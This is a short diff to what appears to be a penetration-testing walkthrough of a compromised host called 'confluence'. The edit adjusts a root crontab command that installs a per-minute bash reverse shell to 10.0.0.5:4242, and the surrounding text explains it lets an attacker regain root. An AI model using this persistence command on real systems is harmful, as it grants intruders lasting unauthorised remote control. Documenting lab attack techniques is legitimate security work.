@@ -291,7 +291,7 @@ root
 - Allows attacker to regain root privileges by listening to port 4242.
 
 ```console
-root@confluence:/tmp# (crontab -l ; echo "*/1 * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
+root@confluence:/tmp# (crontab -l ; echo "* * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
 ```
 ##### Regain
 ```console
